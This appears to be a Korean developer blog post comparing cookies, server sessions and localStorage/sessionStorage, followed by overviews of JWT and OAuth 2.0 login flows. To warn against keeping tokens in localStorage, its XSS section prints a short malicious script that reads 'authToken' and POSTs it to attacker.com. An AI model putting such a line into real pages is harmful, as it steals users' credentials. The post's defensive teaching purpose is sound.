---
layout: post
title: "cookie vs session vs webStorage"
date: 2022-04-03
categories: [cookie, session, webstorage, localstorage, sessionStorage]
disqus_comments: true
pretty_table: true
typograms: true
toc:
  sidebar: left
---

---

cookie, session, webStorage(localStorage & sessionStorage)는 모두 웹 클라이언트와 서버 간 상태 관리 또는 데이터 저장을 위한 기술이지만, 저장 위치, 만료 시점, 전송 여부, 보안 등에서 큰 차이가 있습니다.

### Summary

| 항목 |	Cookie	| Session (서버)	| Web Storage (localStorage, sessionStorage) |
|---|---|---|---|
| 📦 저장 위치	 | 클라이언트(브라우저), 요청 시 서버로 전송됨 |	서버 (ex. 메모리, Redis, DB) |	클라이언트(브라우저), 서버에는 전송되지 않음 |
| 🔁 서버 전송 여부 |	✅ 매 요청마다 자동으로 서버에 전송됨 |	❌ 별도 쿠키나 토큰 없으면 식별 불가 |	❌ 서버에 전송되지 않음 |
| ⏳ 만료 시점 |	expires 또는 max-age로 지정 가능 |	브라우저 종료 or 설정한 타임아웃 |	localStorage: 수동 삭제 전까지 유지, sessionStorage: 탭 종료 시 |
| 📦 저장 용량 |	약 4KB |	서버 설정에 따름 |	약 5~10MB (브라우저별 상이) |
| 🔐 보안 |	HTTPOnly/secure 옵션 설정 가능 |	일반적으로 안전하나 인증 토큰 노출 우려 있음 |	XSS 공격에 취약 (스크립트 접근 가능) |
| 🧩 주요 사용 목적 |	인증, 세션 식별, 사용자 기본 설정 저장	| 사용자 로그인 상태 유지	| UI 상태, 임시 폼 데이터, 캐시 등 클라이언트 전용 정보 |
| 🧱 설정 방법 |	Set-Cookie (서버) 또는 JS (document.cookie)	| 서버측 미들웨어 + 세션 ID 식별 쿠키	| JS API 사용 (localStorage.getItem, setItem) |

---


### 🍪 1. Cookie
- 서버가 클라이언트에 Set-Cookie 헤더로 내려보냄
- 클라이언트는 이후 모든 요청에 해당 쿠키를 자동으로 함께 전송
- 용도: 인증 세션 식별자 저장, 다크모드 설정 저장 등

{% highlight javascript linenos%}
Set-Cookie: sessionId=abc123; HttpOnly; Max-Age=3600; Secure
document.cookie = "username=seungjun; path=/;";
{% endhighlight%}

---

### 🗂️ 2. Session
- 서버에 세션 ID와 사용자 데이터를 저장하고, 클라이언트는 쿠키로 sessionId만 보관
- Express, Django 등 대부분의 서버 프레임워크에서 지원
- 세션은 메모리, Redis, DB 등 다양한 저장소에 저장 가능

{% highlight javascript linenos%}
// Express 예시
app.use(session({
  secret: 'my-secret',
  resave: false,
  saveUninitialized: true
}));
{% endhighlight%}

---

### 💾 3. Web Storage (localStorage / sessionStorage)
- 브라우저 전용 저장소로, 서버와는 무관
- 클라이언트 측에서 자바스크립트로만 접근 가능
- 용도: 페이지 상태 유지, 임시 데이터 캐싱, 테마 설정 등

> ❗주의: localStorage에 토큰 저장 시 XSS에 취약 → 민감 정보는 절대 저장 금지

{% highlight javascript linenos%}
// localStorage
localStorage.setItem("theme", "dark");
const theme = localStorage.getItem("theme");

// sessionStorage
sessionStorage.setItem("step", "2");
{% endhighlight%}


---

### 🔐 보안 리스크 비교

| 항목	 | Cookie |	Session	| localStorage / sessionStorage |
|---|---|---|---|
| 📤 자동 전송 |	✅ (매 요청마다)	| ✅ (sessionId만 전송)	| ❌ (명시적 전송만) |
| ❗ XSS 취약성	 | ❌ (document.cookie로 읽힘 unless HttpOnly) |	❌ (세션ID 탈취 가능성)	| ✅ 심각함 (스크립트로 직접 접근 가능) |
| ❗ CSRF 취약성 |	✅ 자동 전송으로 인해 위험 |	✅ 동일 |	❌ 안전 (자동 전송 X) |
| 🔒 보호 방법 |	HttpOnly, Secure, SameSite |	SameSite + 토큰 재검증	| 민감 정보 절대 저장 금지, CSP 설정 |

---

### 🔐 XSS 예시 위험 (localStorage)
> ⚠️ localStorage에 인증 토큰 절대 저장 금지!

{% highlight javascript linenos%}
// 악성 스크립트
const token = localStorage.getItem('authToken');
fetch('https://attacker.com/steal', { method: 'POST', body: token });
{% endhighlight%}

---


인증 방식 중에서도 실무에서 가장 많이 쓰이는 두 가지엔 JWT 기반 인증 구조와 OAuth 2.0 인증 방식이 있습니다.

JWT는 자체 인증 시스템을 구현할 때 stateless하게 사용자 인증 정보를 주고받을 수 있어서 확장성과 성능 면에서 유리합니다.
반면 OAuth 2.0은 Google, Naver 같은 외부 서비스의 인증을 위임받는 구조로, 복잡하지만 사용자 진입장벽을 낮출 수 있는 장점이 있습니다.
실무에서는 둘을 혼합해 Access Token은 JWT로 구성하고, OAuth 로그인을 통해 초기 인증을 대체하는 방식도 자주 사용하곤 합니다.

---

### JWT

JWT는 3개의 Base64 인코딩된 문자열을 점으로 이어 붙인 형태입니다.

```typograms
xxxxx.yyyyy.zzzzz
│     │      │
│     │      └─ Signature (비밀키 기반 서명)
│     └──────── Payload (sub, exp 등)
└────────────── Header (alg, typ)

// 예시 payload
{
  "sub": "user123",
  "exp": 1713000000,
  "role": "admin"
}
```


JWT 기반 인증 구조는 하기와 같은 요청 흐름을 가집니다.

```typograms
[1] 로그인 요청
    ┌────────────┐
    │  Client    │
    └────┬───────┘
         ↓
POST /login (ID, PW)
         ↓
[2] 서버에서 ID/PW 검증 → JWT 생성
         ↓
[3] 응답: JWT (Access Token)
         ↓
저장 방식
 ├─ 쿠키 (HttpOnly)      ← 보안에 유리
 └─ localStorage        ← 사용 편하지만 XSS 취약

[4] 이후 요청 시
Authorization: Bearer {JWT}
```

| 항목 |	설명 |
|---|---|
| ✅ 장점	| 상태 비저장 (stateless), 확장성 우수, 빠른 인증 |
| ❗ 위험 |	탈취 시 재사용 가능 → exp, refresh token, HttpOnly 등 보완 필수 |
| 💡 실전 전략	 | Access Token 짧게 (15분), Refresh Token은 HttpOnly 쿠키에 저장 & 재발급 API 운영 |

---

### OAuth 2.0 

| 항목	| 설명 |
|---|---|
| Authorization Server	| 사용자 인증 & 토큰 발급 (Google, Kakao 등) |
| Resource Server |	보호된 자원 (사용자 정보 등) |
| Client	| 프론트엔드 앱 or 백엔드 서버 |
| Access Token	| 외부 API 호출에 사용 (일회성, 유효시간 짧음) |
| Refresh Token |	Access Token 재발급용, 노출 주의 |


OAuth 2.0 기반 인증 구조는 하기와 같은 요청 흐름을 가집니다.

```typograms
[1] Client → Authorization Server (ex. Google)
     사용자 로그인 및 권한 승인
           ↓
[2] Redirect with Authorization Code
           ↓
[3] Client → Authorization Server
     POST /token (Authorization Code)
           ↓
[4] Access Token + (Refresh Token)
           ↓
[5] Access Token → Resource Server 호출
           ↓
[6] 사용자 정보 응답
```